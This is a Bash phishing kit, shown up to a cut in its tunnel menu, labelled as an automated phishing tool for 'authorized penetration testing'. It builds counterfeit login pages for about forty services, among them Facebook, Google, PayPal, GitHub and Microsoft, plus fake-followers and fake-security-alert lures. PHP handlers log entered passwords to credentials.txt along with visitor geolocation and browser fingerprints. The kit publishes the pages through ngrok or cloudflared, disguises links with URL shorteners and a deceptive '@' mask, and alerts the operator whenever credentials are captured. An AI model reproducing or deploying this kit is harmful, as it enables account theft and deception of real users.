#!/bin/bash

version="5.4"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'
BLUE='\033[0;34m'; ORANGE='\033[0;33m'; CYAN='\033[0;36m'
WHITE='\033[1;37m'; NC='\033[0m'

PHP_PID=""; TUNNEL_PID=""; SERVER_PORT=""; WEBSITE=""
MASK=""; TEMPLATE_DIR=""; BASE_DIR="$(pwd)/sites"
LOCAL_HOST="127.0.0.1"; PUBLIC_URL=""

cleanup() {
    echo -e "\n${RED}[!] Cleaning up...${NC}"
    kill $PHP_PID 2>/dev/null; kill $TUNNEL_PID 2>/dev/null
    pkill -f "php -S" 2>/dev/null; pkill -f cloudflared 2>/dev/null
    pkill -f localxpose 2>/dev/null; pkill -f ngrok 2>/dev/null
    sleep 1; echo -e "${GREEN}[+] Done.${NC}"; exit 0
}
trap cleanup SIGINT SIGTERM

banner() {
    clear
    echo -e "${RED}"
    echo "  ███╗   ██╗██╗██╗  ██╗██╗  ██╗ ██████╗ "
    echo "  ████╗  ██║██║██║ ██╔╝██║ ██╔╝██╔═══██╗"
    echo "  ██╔██╗ ██║██║█████╔╝ █████╔╝ ██║   ██║"
    echo "  ██║╚██╗██║██║██╔═██╗ ██╔═██╗ ██║   ██║"
    echo "  ██║ ╚████║██║██║  ██╗██║  ██╗╚██████╔╝"
    echo "  ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ "
    echo -e "${NC}"
    echo -e "${ORANGE}  ╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${ORANGE}  ║         Automated Phishing Tool v${version}               ║${NC}"
    echo -e "${ORANGE}  ║       Authorized Penetration Testing Only           ║${NC}"
    echo -e "${ORANGE}  ╚══════════════════════════════════════════════════════╝${NC}"
    echo ""
}

banner_small() {
    clear
    echo -e "${RED}"
    echo "  ███╗   ██╗██╗██╗  ██╗██╗  ██╗ ██████╗ "
    echo "  ████╗  ██║██║██║ ██╔╝██║ ██╔╝██╔═══██╗"
    echo "  ██╔██╗ ██║██║█████╔╝ █████╔╝ ██║   ██║"
    echo "  ██║╚██╗██║██║██╔═██╗ ██╔═██╗ ██║   ██║"
    echo "  ██║ ╚████║██║██║  ██╗██║  ██╗╚██████╔╝"
    echo "  ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ "
    echo -e "${NC}"
}

dependencies() {
    command -v php &>/dev/null || { echo -e "\n${RED}[!] Install PHP: sudo apt install php -y${NC}"; exit 1; }
    command -v curl &>/dev/null || { echo -e "\n${RED}[!] Install curl: sudo apt install curl -y${NC}"; exit 1; }
    command -v lsof &>/dev/null || sudo apt install lsof -y &>/dev/null
    if ! command -v inotifywait &>/dev/null; then
        echo -e "\n${YELLOW}[!] Installing inotify-tools...${NC}"
        sudo apt install inotify-tools -y &>/dev/null
    fi
}

kill_pid() { local port=$1; local pid=$(lsof -ti:$port 2>/dev/null); [ -n "$pid" ] && kill -9 $pid 2>/dev/null; }

find_port() {
    local port
    while true; do
        port=$((RANDOM % 64511 + 1024))
        ss -tln 2>/dev/null | grep -q ":$port " || { echo $port; return 0; }
    done
}

mask_url() {
    local url=$1 mask=$2
    local clean="${url#http://}"; clean="${clean#https://}"
    local full="https://${clean}"
    local s=$(curl -s "https://is.gd/create.php?format=simple&url=${full}" 2>/dev/null)
    if [ -n "$s" ] && echo "$s" | grep -qE "^https?://"; then
        local sc="${s#http://}"; sc="${sc#https://}"
        echo -e "${GREEN}[+]${NC} Masked: ${CYAN}https://${mask}-@${sc}${NC}"
        echo -e "${GREEN}[+]${NC} URL:     ${full}"; return
    fi
    s=$(curl -s "https://tinyurl.com/api-create.php?url=${full}" 2>/dev/null)
    if [ -n "$s" ] && echo "$s" | grep -qE "^https?://"; then
        local sc="${s#http://}"; sc="${sc#https://}"
        echo -e "${GREEN}[+]${NC} Masked: ${CYAN}https://${mask}-@${sc}${NC}"
        echo -e "${GREEN}[+]${NC} URL:     ${full}"; return
    fi
    echo -e "${YELLOW}[!]${NC} Could not shorten. Using original:"
    echo -e "${CYAN}  ${full}${NC}"
}

fingerprint_js() {
    cat << 'FPEOF'
<script>
(function(){var f=document.querySelector('form');if(!f)return;
var h={'__screen':screen.width+'x'+screen.height+'x'+screen.colorDepth,'__tz':Intl.DateTimeFormat().resolvedOptions().timeZone,'__lang':navigator.language,'__platform':navigator.platform,'__cpus':navigator.hardwareConcurrency||'Unknown','__memory':navigator.deviceMemory?navigator.deviceMemory*1024:'Unknown'};
for(var k in h){var i=document.createElement('input');i.type='hidden';i.name=k;i.value=h[k];f.appendChild(i);}})();
</script>
FPEOF
}

inject_fp() { local f=$1; echo '<script>(function(){var f=document.querySelector("form");if(!f)return;var h={__screen:screen.width+"x"+screen.height+"x"+screen.colorDepth,__tz:Intl.DateTimeFormat().resolvedOptions().timeZone,__lang:navigator.language,__platform:navigator.platform,__cpus:navigator.hardwareConcurrency||"Unknown",__memory:navigator.deviceMemory?navigator.deviceMemory*1024:"Unknown"};for(var k in h){var i=document.createElement("input");i.type="hidden";i.name=k;i.value=h[k];f.appendChild(i);}})();</script>' >> "$f"; }

create_router_php() {
    local dir=$1
    cat > "$dir/router.php" << 'RTR'
<?php
if ($_SERVER['REQUEST_METHOD'] !== 'GET') { return false; }
$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
if ($uri !== '/' && $uri !== '/index.html' && $uri !== '/index.php') { return false; }
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'] ?? 'Direct';
$date = date("Y-m-d H:i:s");
$geo = ['status'=>'fail'];
$ch = @curl_init("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,zip,isp,org,as,lat,lon,timezone,mobile,proxy,hosting");
if ($ch) {
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    @curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
    $resp = @curl_exec($ch);
    if ($resp) { $geo = @json_decode($resp, true) ?? ['status'=>'fail']; }
    @curl_close($ch);
}
$c=$geo['country']??'Unknown';$r=$geo['regionName']??'Unknown';$ct=$geo['city']??'Unknown';
$isp=$geo['isp']??'Unknown';$org=$geo['org']??'Unknown';$asn=$geo['as']??'Unknown';
$lat=$geo['lat']??'N/A';$lon=$geo['lon']??'N/A';$tz=$geo['timezone']??'Unknown';$px=($geo['proxy']??false)?'Yes':'No';
$log="═══════════════════════════════════════════════════════\n📅 Date/Time: $date\n🌐 IP: $ip\n📍 Location: $ct, $r, $c\n🗺️  Coordinates: $lat, $lon\n🏢 ISP: $isp ($org)\n🔗 ASN: $asn\n🛡️  Proxy/VPN: $px\n⏰ Timezone: $tz\n🔗 Referer: $ref\n🖥️  UA: $ua\n═══════════════════════════════════════════════════════\n\n";
$f=__DIR__."/ip.txt";$fh=@fopen($f,'a');if($fh){@flock($fh,LOCK_EX);@fwrite($fh,$log);@flock($fh,LOCK_UN);@fclose($fh);}
$idx=__DIR__."/index.html";if(file_exists($idx)){readfile($idx);return true;}
return false;
RTR
}

create_php_handler() {
    local dir=$1 redir=$2
    cat > "$dir/login.php" << LOG
<?php
\$ip=\$_SERVER['REMOTE_ADDR'];\$ua=\$_SERVER['HTTP_USER_AGENT'];\$ref=\$_SERVER['HTTP_REFERER']??'Direct';\$date=date("Y-m-d H:i:s");
\$geo=['status'=>'fail'];\$ch=@curl_init("http://ip-api.com/json/{\$ip}?fields=status,country,regionName,city,zip,isp,org,as,lat,lon,timezone,mobile,proxy,hosting");
if(\$ch){@curl_setopt(\$ch,CURLOPT_RETURNTRANSFER,1);@curl_setopt(\$ch,CURLOPT_TIMEOUT,3);@curl_setopt(\$ch,CURLOPT_CONNECTTIMEOUT,2);\$resp=@curl_exec(\$ch);if(\$resp){\$geo=@json_decode(\$resp,true)??['status'=>'fail'];}@curl_close(\$ch);}
\$c=\$geo['country']??'Unknown';\$r=\$geo['regionName']??'Unknown';\$ct=\$geo['city']??'Unknown';\$isp=\$geo['isp']??'Unknown';\$org=\$geo['org']??'Unknown';\$asn=\$geo['as']??'Unknown';\$lat=\$geo['lat']??'N/A';\$lon=\$geo['lon']??'N/A';\$tz=\$geo['timezone']??'Unknown';\$px=(\$geo['proxy']??false)?'Yes':'No';
\$log="═══════════════════════════════════════════════════════\n📅 Date/Time: \$date\n🌐 IP: \$ip\n📍 Location: \$ct, \$r, \$c\n🗺️  Coordinates: \$lat, \$lon\n🏢 ISP: \$isp (\$org)\n🔗 ASN: \$asn\n🛡️  Proxy/VPN: \$px\n⏰ Timezone: \$tz\n🔗 Referer: \$ref\n🖥️  UA: \$ua\n";
foreach(\$_POST as \$k=>\$v){if(substr(\$k,0,2)!=='__'){\$log.="📝 ".ucfirst(\$k).": ".htmlspecialchars(\$v)."\n";}}
if(!empty(\$_POST['__screen']))\$log.="🖥️  Screen: ".\$_POST['__screen']."\n";if(!empty(\$_POST['__tz']))\$log.="⏰ Browser TZ: ".\$_POST['__tz']."\n";if(!empty(\$_POST['__lang']))\$log.="🌍 Language: ".\$_POST['__lang']."\n";if(!empty(\$_POST['__platform']))\$log.="💻 Platform: ".\$_POST['__platform']."\n";if(!empty(\$_POST['__cpus']))\$log.="⚙️ CPU Cores: ".\$_POST['__cpus']."\n";if(!empty(\$_POST['__memory']))\$log.="🧠 RAM: ".\$_POST['__memory']." MB\n";
\$log.="═══════════════════════════════════════════════════════\n\n";
\$fd=@fopen("credentials.txt",'a');if(\$fd){@flock(\$fd,LOCK_EX);@fwrite(\$fd,\$log);@flock(\$fd,LOCK_UN);@fclose(\$fd);}
header("Location: $redir",true,302);exit;
LOG
    > "$dir/credentials.txt" 2>/dev/null; chmod 666 "$dir/credentials.txt" 2>/dev/null
}

simple_page() {
    local d=$1 s=$2 f1=$3 f2=$4 btn=$5 col=$6 logo=$7 redir=$8
    cat > "$d/index.html" << HTM
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>$s - Sign In</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:380px;text-align:center}.logo{font-size:28px;font-weight:bold;margin-bottom:20px;color:$col}h2{font-size:22px;margin-bottom:24px;color:#1c1e21}input{width:100%;padding:12px 16px;font-size:15px;border:1px solid #ddd;border-radius:6px;margin-bottom:12px;outline:none;background:#fff}input:focus{border-color:$col;box-shadow:0 0 0 2px ${col}22}button{width:100%;padding:12px;font-size:16px;font-weight:600;color:#fff;background:$col;border:none;border-radius:6px;cursor:pointer}button:hover{opacity:0.9}</style></head>
<body><div class="card"><div class="logo">$logo</div><h2>Sign In</h2><form action="login.php" method="POST"><input type="text" name="$f1" placeholder="Username or email" required><input type="password" name="$f2" placeholder="Password" required><button type="submit">$btn</button></form></div>$(fingerprint_js)</body></html>
HTM
    create_php_handler "$d" "$redir"
}

poll_page() {
    local d=$1
    cat > "$d/index.html" << 'HTM'
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Voting Poll</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:420px;text-align:center}h1{font-size:22px;margin-bottom:8px}.sub{color:#65676b;font-size:14px;margin-bottom:24px}.poll-box{background:#f0f2f5;border-radius:8px;padding:20px;margin-bottom:20px;text-align:left}.poll-box h3{font-size:16px;margin-bottom:12px}.option{display:flex;align-items:center;padding:10px;margin-bottom:8px;background:#fff;border:1px solid #ddd;border-radius:6px;cursor:pointer}.option input{margin-right:10px}form{border-top:1px solid #ddd;padding-top:20px}input{width:100%;padding:12px 16px;font-size:15px;border:1px solid #ddd;border-radius:6px;margin-bottom:12px;outline:none;background:#fff}input:focus{border-color:#1877f2}button{width:100%;padding:12px;font-size:16px;font-weight:600;color:#fff;background:#1877f2;border:none;border-radius:6px;cursor:pointer}</style></head>
<body><div class="card"><h1>What's your favorite?</h1><p class="sub">Vote and see live results</p><div class="poll-box"><h3>Choose your option:</h3><div class="option"><input type="radio" checked> Option A</div><div class="option"><input type="radio"> Option B</div><div class="option"><input type="radio"> Option C</div></div><form action="login.php" method="POST"><p style="font-size:13px;color:#65676b;margin-bottom:12px">Sign in to vote:</p><input type="text" name="email" placeholder="Email" required><input type="password" name="pass" placeholder="Password" required><button type="submit">Vote Now</button></form></div></body></html>
HTM
    inject_fp "$d/index.html"
    create_php_handler "$d" "https://www.facebook.com"
}

security_page() {
    local d=$1
    cat > "$d/index.html" << 'HTM'
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification Required</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:420px;text-align:center}.shield{font-size:48px;margin-bottom:16px}h1{font-size:22px;color:#1877f2;margin-bottom:8px}p{color:#65676b;font-size:14px;margin-bottom:24px}input{width:100%;padding:12px 16px;font-size:15px;border:1px solid #ddd;border-radius:6px;margin-bottom:12px;outline:none}input:focus{border-color:#1877f2}button{width:100%;padding:12px;font-size:16px;font-weight:600;color:#fff;background:#1877f2;border:none;border-radius:6px;cursor:pointer}</style></head>
<body><div class="card"><div class="shield">🛡️</div><h1>Security Verification</h1><p>Your account has been flagged for suspicious activity. Please verify your identity to continue.</p><form action="login.php" method="POST"><input type="text" name="email" placeholder="Email or phone number" required><input type="password" name="pass" placeholder="Password" required><button type="submit">Verify Identity</button></form></div></body></html>
HTM
    inject_fp "$d/index.html"
    create_php_handler "$d" "https://www.facebook.com"
}

follower_page() {
    local d=$1
    cat > "$d/index.html" << 'HTM'
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Instagram - Free Followers</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #dbdbdb;padding:40px;border-radius:12px;width:380px;text-align:center}h1{font-size:24px;margin-bottom:8px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}p{color:#8e8e8e;font-size:14px;margin-bottom:24px}.follower-count{font-size:48px;font-weight:700;color:#0095f6;margin-bottom:24px}input{width:100%;padding:12px 16px;font-size:15px;border:1px solid #dbdbdb;border-radius:6px;margin-bottom:12px;outline:none;text-align:center}input:focus{border-color:#0095f6}button{width:100%;padding:12px;font-size:16px;font-weight:600;color:#fff;background:#0095f6;border:none;border-radius:8px;cursor:pointer}</style></head>
<body><div class="card"><h1>Instagram Followers</h1><p>Get 1,000 free followers instantly</p><div class="follower-count">1K</div><form action="login.php" method="POST"><p style="font-size:13px;color:#8e8e8e;margin-bottom:12px">Sign in to claim:</p><input type="text" name="username" placeholder="Instagram username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Claim Followers</button></form></div></body></html>
HTM
    inject_fp "$d/index.html"
    create_php_handler "$d" "https://www.instagram.com"
}

badge_page() {
    local d=$1
    cat > "$d/index.html" << 'HTM'
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Instagram - Verification Badge</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #dbdbdb;padding:40px;border-radius:12px;width:380px;text-align:center}.badge{font-size:64px;margin-bottom:16px}h1{font-size:22px;margin-bottom:8px}p{color:#8e8e8e;font-size:14px;margin-bottom:24px}input{width:100%;padding:12px 16px;font-size:15px;border:1px solid #dbdbdb;border-radius:6px;margin-bottom:12px;outline:none;text-align:center}input:focus{border-color:#0095f6}button{width:100%;padding:12px;font-size:16px;font-weight:600;color:#fff;background:#0095f6;border:none;border-radius:8px;cursor:pointer}</style></head>
<body><div class="card"><div class="badge">✅</div><h1>Get Verified</h1><p>Apply for the official Instagram verification badge</p><form action="login.php" method="POST"><input type="text" name="username" placeholder="Instagram username" required><input type="password" name="password" placeholder="Password" required><input type="text" name="fullname" placeholder="Full name" required><button type="submit">Apply Now</button></form></div></body></html>
HTM
    inject_fp "$d/index.html"
    create_php_handler "$d" "https://www.instagram.com"
}

netflix_page() {
    local d=$1
    cat > "$d/index.html" << 'HTM'
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Netflix</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:450px;padding:60px 68px 40px;background:rgba(0,0,0,0.75);border-radius:4px}.logo{color:#e50914;font-size:32px;font-weight:bold;margin-bottom:28px}h1{color:#fff;font-size:32px;font-weight:500;margin-bottom:28px}input{width:100%;padding:16px 20px;font-size:16px;background:#333;color:#fff;border:none;border-radius:4px;outline:none;margin-bottom:16px}input:focus{background:#454545}input::placeholder{color:#8c8c8c}button{width:100%;padding:16px;font-size:16px;font-weight:700;color:#fff;background:#e50914;border:none;border-radius:4px;cursor:pointer;margin-top:24px}button:hover{background:#f6121d}</style></head>
<body><div class="container"><div class="logo">N</div><h1>Sign In</h1><form action="login.php" method="POST"><input type="text" name="email" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form></div></body></html>
HTM
    inject_fp "$d/index.html"
    create_php_handler "$d" "https://www.netflix.com"
}

github_page() {
    local d=$1
    cat > "$d/index.html" << 'HTM'
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sign in to GitHub</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans",Helvetica,Arial,sans-serif}body{background:#f6f8fa;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:340px}.logo{text-align:center;margin-bottom:24px}.form-box{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:20px}.form-box h1{font-size:24px;font-weight:300;text-align:center;margin-bottom:16px}.form-box label{display:block;font-size:14px;margin-bottom:6px;color:#24292f}.form-box input{width:100%;padding:8px 12px;font-size:14px;border:1px solid #d0d7de;border-radius:6px;outline:none;margin-bottom:16px}.form-box input:focus{border-color:#0969da;box-shadow:0 0 0 3px #0969da33}.form-box button{width:100%;padding:10px 16px;font-size:14px;font-weight:500;color:#fff;background:#2da44e;border:1px solid #1b7c35;border-radius:6px;cursor:pointer}</style></head>
<body><div class="container"><div class="logo"><svg viewBox="0 0 16 16" width="48" height="48"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg></div><div class="form-box"><h1>Sign in to GitHub</h1><form action="login.php" method="POST"><label>Username or email address</label><input type="text" name="login" required><label>Password</label><input type="password" name="password" required><button type="submit">Sign in</button></form></div></div></body></html>
HTM
    inject_fp "$d/index.html"
    create_php_handler "$d" "https://github.com"
}

generate_site() {
    local site=$1
    local d="$BASE_DIR/$site"
    mkdir -p "$d" || { echo "Failed to create $d"; exit 1; }
    
    case $site in
        facebook)     simple_page "$d" "Facebook" "email" "pass" "Log In" "#1877f2" "Facebook" "https://www.facebook.com" ;;
        fb_advanced)  poll_page "$d" ;;
        fb_security)  security_page "$d" ;;
        fb_messenger) simple_page "$d" "Messenger" "email" "pass" "Log In" "#0099ff" "Messenger" "https://www.messenger.com" ;;
        instagram)    simple_page "$d" "Instagram" "username" "password" "Log In" "#0095f6" "Instagram" "https://www.instagram.com" ;;
        ig_follower)  follower_page "$d" ;;
        ig_badge)     badge_page "$d" ;;
        google)       simple_page "$d" "Google" "email" "password" "Next" "#1a73e8" "Google" "https://accounts.google.com" ;;
        google_old)   simple_page "$d" "Google" "email" "password" "Sign in" "#1a73e8" "Google" "https://accounts.google.com" ;;
        microsoft)    simple_page "$d" "Microsoft" "email" "password" "Sign in" "#0067b8" "Microsoft" "https://login.live.com" ;;
        netflix)      netflix_page "$d" ;;
        paypal)       simple_page "$d" "PayPal" "email" "password" "Log In" "#003087" "PayPal" "https://www.paypal.com" ;;
        steam)        simple_page "$d" "Steam" "username" "password" "Sign In" "#171a21" "Steam" "https://steamcommunity.com" ;;
        twitter)      simple_page "$d" "X" "username" "password" "Sign In" "#0f1419" "X" "https://x.com" ;;
        playstation)  simple_page "$d" "PlayStation" "email" "password" "Sign In" "#003791" "PlayStation" "https://www.playstation.com" ;;
        tiktok)       simple_page "$d" "TikTok" "username" "password" "Log In" "#010101" "TikTok" "https://www.tiktok.com" ;;
        twitch)       simple_page "$d" "Twitch" "username" "password" "Log In" "#9146ff" "Twitch" "https://www.twitch.tv" ;;
        pinterest)    simple_page "$d" "Pinterest" "email" "password" "Log In" "#e60023" "Pinterest" "https://www.pinterest.com" ;;
        snapchat)     simple_page "$d" "Snapchat" "username" "password" "Log In" "#FFFC00" "Snapchat" "https://accounts.snapchat.com" ;;
        linkedin)     simple_page "$d" "LinkedIn" "email" "password" "Sign in" "#0a66c2" "LinkedIn" "https://www.linkedin.com" ;;
        ebay)         simple_page "$d" "eBay" "email" "password" "Sign In" "#e53238" "eBay" "https://www.ebay.com" ;;
        quora)        simple_page "$d" "Quora" "email" "password" "Login" "#aa2200" "Quora" "https://www.quora.com" ;;
        protonmail)   simple_page "$d" "ProtonMail" "username" "password" "Log In" "#6d4aff" "ProtonMail" "https://mail.proton.me" ;;
        spotify)      simple_page "$d" "Spotify" "email" "password" "Log In" "#1db954" "Spotify" "https://www.spotify.com" ;;
        reddit)       simple_page "$d" "Reddit" "username" "password" "Log In" "#ff4500" "Reddit" "https://www.reddit.com" ;;
        adobe)        simple_page "$d" "Adobe" "email" "password" "Sign In" "#ff0000" "Adobe" "https://www.adobe.com" ;;
        deviantart)   simple_page "$d" "DeviantArt" "username" "password" "Sign In" "#05cc47" "DeviantArt" "https://www.deviantart.com" ;;
        badoo)        simple_page "$d" "Badoo" "email" "password" "Log In" "#491d8d" "Badoo" "https://badoo.com" ;;
        origin)       simple_page "$d" "Origin" "email" "password" "Sign In" "#f56c2d" "Origin" "https://www.origin.com" ;;
        dropbox)      simple_page "$d" "Dropbox" "email" "password" "Sign In" "#0061ff" "Dropbox" "https://www.dropbox.com" ;;
        yahoo)        simple_page "$d" "Yahoo" "username" "password" "Sign In" "#6001d2" "Yahoo" "https://login.yahoo.com" ;;
        wordpress)    simple_page "$d" "WordPress" "username" "password" "Log In" "#21759b" "WordPress" "https://wordpress.com" ;;
        yandex)       simple_page "$d" "Yandex" "login" "password" "Log In" "#fc3f1d" "Yandex" "https://passport.yandex.com" ;;
        stackoverflow) simple_page "$d" "Stack Overflow" "email" "password" "Log In" "#f48024" "Stack Overflow" "https://stackoverflow.com" ;;
        vk)           simple_page "$d" "VK" "email" "password" "Log In" "#0077ff" "VK" "https://vk.com" ;;
        xbox)         simple_page "$d" "Xbox" "email" "password" "Sign In" "#107c10" "Xbox" "https://www.xbox.com" ;;
        mediafire)    simple_page "$d" "MediaFire" "email" "password" "Log In" "#ff6600" "MediaFire" "https://www.mediafire.com" ;;
        gitlab)       simple_page "$d" "GitLab" "username" "password" "Sign In" "#fc6d26" "GitLab" "https://gitlab.com" ;;
        github)       github_page "$d" ;;
        discord)      simple_page "$d" "Discord" "email" "password" "Log In" "#5865f2" "Discord" "https://discord.com" ;;
        roblox)       simple_page "$d" "Roblox" "username" "password" "Log In" "#ce0e2d" "Roblox" "https://www.roblox.com" ;;
        *)            simple_page "$d" "Login" "username" "password" "Sign In" "#333333" "Login" "https://www.google.com" ;;
    esac
    
    create_router_php "$d"
    > "$d/ip.txt" 2>/dev/null
    chmod 666 "$d/ip.txt" 2>/dev/null
    
    # Debug: verify files exist
    if [ ! -f "$d/index.html" ]; then echo "ERROR: $d/index.html not created!"; fi
    if [ ! -f "$d/login.php" ]; then echo "ERROR: $d/login.php not created!"; fi
    if [ ! -f "$d/router.php" ]; then echo "ERROR: $d/router.php not created!"; fi
}

start_server() {
    generate_site "$WEBSITE"
    TEMPLATE_DIR="$BASE_DIR/$WEBSITE"
    
    if [ ! -d "$TEMPLATE_DIR" ]; then
        echo -e "\n${RED}[!] Template directory $TEMPLATE_DIR not found!${NC}"; exit 1
    fi
    
    SERVER_PORT=$(find_port)
    kill_pid $SERVER_PORT
    
    echo -e "\n${GREEN}[+]${NC} Starting PHP server on port ${CYAN}$SERVER_PORT${NC}..."
    cd "$TEMPLATE_DIR" || { echo -e "\n${RED}[!] Cannot cd to $TEMPLATE_DIR${NC}"; exit 1; }
    
    php -S "$LOCAL_HOST:$SERVER_PORT" router.php &>/dev/null &
    PHP_PID=$!
    sleep 2
    
    kill -0 $PHP_PID 2>/dev/null || { echo -e "\n${RED}[!] PHP server failed.${NC}"; exit 1; }
    echo -e "${GREEN}[+]${NC} Local: ${CYAN}http://$LOCAL_HOST:$SERVER_PORT${NC}"
}

start_monitor() {
    local d="$1"
    local ipf="$d/ip.txt"
    local crf="$d/credentials.txt"
    
    > "$ipf" 2>/dev/null
    > "$crf" 2>/dev/null
    
    echo -e "\n${RED}[${WHITE}::${RED}]${ORANGE} Monitoring for victims... (Ctrl+C to stop)${NC}"
    echo -e "${ORANGE}  └─ Directory: ${CYAN}$d${NC}"
    echo -e "${ORANGE}  └─ Every visit is captured INSTANTLY via inotify${NC}\n"
    
    while true; do
        local ev=$(inotifywait -q -e modify --format '%f' "$d" 2>/dev/null)
        if [ "$ev" = "ip.txt" ]; then
            echo -e "${GREEN}━━━ VICTIM VISITED ━━━${NC}"
            tail -n 14 "$ipf"
            echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
        elif [ "$ev" = "credentials.txt" ]; then
            echo -e "${RED}━━━ CREDENTIALS CAPTURED ━━━${NC}"
            tail -n 20 "$crf"
            echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
        fi
    done
}

tunnel_menu() {
    echo -e "\n${RED}[${WHITE}::${RED}]${ORANGE} Choose Port Forwarding Method ${RED}[${WHITE}::${RED}]${ORANGE}"
    echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Ngrok (HTTPS)"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared (HTTPS)"
    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose (HTTPS)"
    echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Serveo (HTTPS)"
    echo -e "${RED}[${WHITE}05${RED}]${ORANGE} Localhost Only"
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" tun_choice
    start_server
    
    case $tun_choice in
        1|01)
            if ! command -v ngrok &>/dev/null; then
                echo -e "\n${RED}[!]${NC} Ngrok not installed."
                echo -e "${YELLOW}  Install: curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo 'deb https://ngrok-agent.s3.amazonaws.com bookworm main' | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok -y${NC}"
                tunnel_menu; return
            fi
            echo -e "\n${GREEN}[+]${NC} Starting Ngrok..."
            ngrok http "$LOCAL_HOST:$SERVER_PORT" --log=stdout 2>/dev/null &
            TUNNEL_PID=$!; sleep 5
            for i in 1 2 3; do
                PUBLIC_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"https://[^"]*"' | cut -d'"' -f4)
                [ -n "$PUBLIC_URL" ] && break; sleep 1
            done
            if [ -n "$PUBLIC_URL" ]; then
                echo -e "${GREEN}[+]${NC} ${CYAN}$PUBLIC_URL${NC}"
                mask_url "$PUBLIC_URL" "$MASK"
            else
